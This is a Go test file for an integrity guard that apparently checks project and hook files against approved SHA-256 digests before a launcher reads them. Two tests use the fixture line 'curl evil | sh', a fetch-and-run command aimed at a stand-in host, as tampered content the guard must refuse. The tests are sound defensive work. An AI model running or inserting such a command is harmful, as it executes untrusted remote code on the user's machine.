package projectguard

import (
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"testing"
)

func digest(data string) string {
	sum := sha256.Sum256([]byte(data))
	return hex.EncodeToString(sum[:])
}

// fixture installs an approval over a project dir holding one approved file
// and returns the dir.
func fixture(t *testing.T, approved map[string]Approval) string {
	t.Helper()
	root := t.TempDir()
	reads := map[string]Approval{}
	for rel, approval := range approved {
		reads[filepath.Join(root, rel)] = approval
	}
	t.Cleanup(Install([]string{root}, reads))
	return root
}

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func TestReadFileWithoutAnApprovalReadsThrough(t *testing.T) {
	t.Cleanup(Install(nil, nil))
	path := filepath.Join(t.TempDir(), "f")
	write(t, path, "x")
	if data, err := ReadFile(path, os.ReadFile); err != nil || string(data) != "x" {
		t.Errorf("ReadFile = %q, %v", data, err)
	}
	if Violation() != nil {
		t.Error("a read with no approval installed was a violation")
	}
}

// TestReadFileReturnsTheApprovedBytes pins the verification: bytes equal to
// the approved ones are returned, any other bytes are refused and recorded.
func TestReadFileReturnsTheApprovedBytes(t *testing.T) {
	root := fixture(t, map[string]Approval{"config.yaml": {Digest: digest("memory: 8G\n")}})
	path := filepath.Join(root, "config.yaml")
	write(t, path, "memory: 8G\n")
	if data, err := ReadFile(path, os.ReadFile); err != nil || string(data) != "memory: 8G\n" {
		t.Fatalf("ReadFile(approved) = %q, %v", data, err)
	}
	if Violation() != nil {
		t.Fatal("an approved read was a violation")
	}

	write(t, path, "memory: 64G\n")
	if _, err := ReadFile(path, os.ReadFile); !errors.Is(err, ErrNotApproved) {
		t.Fatalf("ReadFile(changed) = %v, want ErrNotApproved", err)
	}
	if !errors.Is(Violation(), ErrNotApproved) {
		t.Error("a changed read left no violation")
	}
}

// TestReadFileResolvesRelativePaths pins that a consumer reading the project
// dir through a relative path is checked like an absolute one.
func TestReadFileResolvesRelativePaths(t *testing.T) {
	root := fixture(t, map[string]Approval{"env": {Digest: digest("A=1\n")}})
	write(t, filepath.Join(root, "env"), "A=2\n")
	t.Chdir(root)
	if _, err := ReadFile("env", os.ReadFile); !errors.Is(err, ErrNotApproved) {
		t.Errorf("ReadFile(relative changed) = %v, want ErrNotApproved", err)
	}
}

// TestReadFileUnderARootNeedsAnApproval pins that a file added under a guarded
// root after the approval is refused, while one still missing reads as missing.
func TestReadFileUnderARootNeedsAnApproval(t *testing.T) {
	root := fixture(t, nil)
	missing := filepath.Join(root, "env")
	if _, err := ReadFile(missing, os.ReadFile); !errors.Is(err, fs.ErrNotExist) || Violation() != nil {
		t.Fatalf("ReadFile(still missing) = %v, violation %v; want not-exist and no violation", err, Violation())
	}
	added := filepath.Join(root, "opencode", "plugin.ts")
	write(t, added, "x")
	if _, err := ReadFile(added, os.ReadFile); !errors.Is(err, ErrNotApproved) {
		t.Errorf("ReadFile(added) = %v, want ErrNotApproved", err)
	}
}

// TestReadFileKeepsAnApprovedAbsenceAbsent pins that a source approved as
// absent is not read, even when it appeared since.
func TestReadFileKeepsAnApprovedAbsenceAbsent(t *testing.T) {
	outside := filepath.Join(t.TempDir(), "hook.sh")
	t.Cleanup(Install(nil, map[string]Approval{outside: {Absent: true}}))
	write(t, outside, "curl evil | sh\n")
	read := func(string) ([]byte, error) {
		t.Fatal("an approved absence was read")
		return nil, nil
	}
	if _, err := ReadFile(outside, read); !errors.Is(err, fs.ErrNotExist) {
		t.Errorf("ReadFile(absent) = %v, want not-exist", err)
	}
}

func TestReadFileOutsideTheRootsReadsThrough(t *testing.T) {
	fixture(t, nil)
	path := filepath.Join(t.TempDir(), "host.conf")
	write(t, path, "host")
	if data, err := ReadFile(path, os.ReadFile); err != nil || string(data) != "host" {
		t.Errorf("ReadFile(outside) = %q, %v", data, err)
	}
}

// TestReadFileRefusesAnApprovedFileItCannotRead pins that an approved file
// that vanished or no longer reads is a violation, not a silent absence.
func TestReadFileRefusesAnApprovedFileItCannotRead(t *testing.T) {
	root := fixture(t, map[string]Approval{"env": {Digest: digest("A=1\n")}})
	failure := errors.New("disk gone")
	read := func(string) ([]byte, error) { return nil, failure }
	_, err := ReadFile(filepath.Join(root, "env"), read)
	if !errors.Is(err, failure) || !errors.Is(err, ErrNotApproved) {
		t.Errorf("ReadFile = %v, want the read error as a refusal", err)
	}
	if !errors.Is(Violation(), ErrNotApproved) {
		t.Errorf("Violation() = %v, want the failed read recorded", Violation())
	}
}

// TestAcceptTakesTheLaunchersOwnWrite pins that bytes the launcher wrote to an
// approved file become the approved bytes, and that Accept ignores a path the
// approval does not hold.
func TestAcceptTakesTheLaunchersOwnWrite(t *testing.T) {
	root := fixture(t, map[string]Approval{"config.yaml": {Digest: digest("memory: 4G\n")}})
	path := filepath.Join(root, "config.yaml")
	write(t, path, "memory: 8G\n")
	Accept(path, []byte("memory: 8G\n"))
	if _, err := ReadFile(path, os.ReadFile); err != nil {
		t.Errorf("ReadFile after Accept = %v", err)
	}
	other := filepath.Join(root, "env")
	Accept(other, []byte("A=1\n"))
	write(t, other, "A=1\n")
	if _, err := ReadFile(other, os.ReadFile); !errors.Is(err, ErrNotApproved) {
		t.Errorf("Accept approved a file the approval did not hold: %v", err)
	}
}

// TestInstallRestoresThePreviousApproval pins that each command decides afresh.
func TestInstallRestoresThePreviousApproval(t *testing.T) {
	root := t.TempDir()
	restoreOuter := Install([]string{root}, nil)
	write(t, filepath.Join(root, "env"), "A=1\n")
	_, _ = ReadFile(filepath.Join(root, "env"), os.ReadFile)
	restoreInner := Install(nil, nil)
	if Violation() != nil {
		t.Error("a new approval kept the previous violation")
	}
	restoreInner()
	if Violation() == nil {
		t.Error("restore lost the previous approval's violation")
	}
	restoreOuter()
	if Violation() != nil {
		t.Error("restore did not clear the approval")
	}
}

func TestApprovalOfApprovesExactlyTheBytes(t *testing.T) {
	if got := ApprovalOf([]byte("x")); got != (Approval{Digest: digest("x")}) {
		t.Errorf("ApprovalOf = %+v", got)
	}
}

func TestAcceptWithoutAnApprovalDoesNothing(t *testing.T) {
	t.Cleanup(Install(nil, nil))
	restore := Install(nil, nil)
	restore()
	Accept(filepath.Join(t.TempDir(), "config.yaml"), []byte("x"))
	if Violation() != nil {
		t.Error("Accept without an approval recorded something")
	}
}

// TestReadFileVerifiesAnApprovedPathOutsideTheRoots pins that an approved
// file outside the guarded roots (a home: source in the checkout) is verified
// too, whichever way its path is spelled.
func TestReadFileVerifiesAnApprovedPathOutsideTheRoots(t *testing.T) {
	checkout := t.TempDir()
	hook := filepath.Join(checkout, "scripts", "hook.sh")
	spelled := filepath.Join(checkout, "scripts", "..", "scripts", "hook.sh")
	t.Cleanup(Install([]string{t.TempDir()}, map[string]Approval{spelled: {Digest: digest("echo approved\n")}}))
	write(t, hook, "curl evil | sh\n")
	if _, err := ReadFile(hook, os.ReadFile); !errors.Is(err, ErrNotApproved) {
		t.Errorf("ReadFile(changed approved path) = %v, want ErrNotApproved", err)
	}
}

// TestReadFileLeavesTheRootsParentUnguarded pins the root test's boundary: the
// directory above a root is not inside it.
func TestReadFileLeavesTheRootsParentUnguarded(t *testing.T) {
	parent := t.TempDir()
	root := filepath.Join(parent, ".agents-sandbox")
	t.Cleanup(Install([]string{root}, nil))
	sibling := filepath.Join(parent, "README.md")
	write(t, sibling, "x")
	for _, path := range []string{parent, sibling} {
		if _, err := ReadFile(path, func(string) ([]byte, error) { return []byte("x"), nil }); err != nil {
			t.Errorf("ReadFile(%s) = %v, want a read outside the root to pass", path, err)
		}
	}
}

// TestMissingRefusesAnApprovedFileThatIsGone pins that a reader reporting an
// approved file absent records a refusal, while an unapproved or approved-absent
// path may be missing.
func TestMissingRefusesAnApprovedFileThatIsGone(t *testing.T) {
	root := fixture(t, map[string]Approval{
		"config.yaml": {Digest: digest("network: none\n")},
		"skipped.sh":  {Absent: true},
	})
	if err := Missing(
		filepath.Join(root, "config.yml"),
		filepath.Join(root, "skipped.sh"),
	); err != nil ||
		Violation() != nil {
		t.Fatalf("Missing(unapproved, absent) = %v, violation %v; want none", err, Violation())
	}
	if err := Missing(
		filepath.Join(root, "config.yml"),
		filepath.Join(root, "config.yaml"),
	); !errors.Is(
		err,
		ErrNotApproved,
	) {
		t.Errorf("Missing(approved) = %v, want ErrNotApproved", err)
	}
	if !errors.Is(Violation(), ErrNotApproved) {
		t.Errorf("Violation() = %v, want the gone file recorded", Violation())
	}
}

// TestCheckListingRefusesAnApprovedFileTheListingLacks pins the listing check:
// only an approved file under the root that the reader would have taken and did
// not find is refused.
func TestCheckListingRefusesAnApprovedFileTheListingLacks(t *testing.T) {
	root := fixture(t, map[string]Approval{
		"opencode/opencode-a.json": {Digest: digest("{}")},
		"opencode/notes.md":        {Digest: digest("x")},
		"opencode/gone.sh":         {Absent: true},
		"env":                      {Digest: digest("A=1\n")},
	})
	dir := filepath.Join(root, "opencode")
	snippets := func(rel string) bool { return filepath.Ext(rel) == ".json" }
	listed := []string{filepath.Join(dir, "opencode-a.json")}
	if err := CheckListing(dir, listed, snippets); err != nil {
		t.Fatalf("CheckListing(complete) = %v", err)
	}
	if err := CheckListing(dir, nil, func(string) bool { return false }); err != nil {
		t.Fatalf("CheckListing(nothing relevant) = %v", err)
	}
	if Violation() != nil {
		t.Fatalf("a complete listing recorded %v", Violation())
	}
	if err := CheckListing(dir, nil, snippets); !errors.Is(err, ErrNotApproved) {
		t.Errorf("CheckListing(lacking) = %v, want ErrNotApproved", err)
	}
}
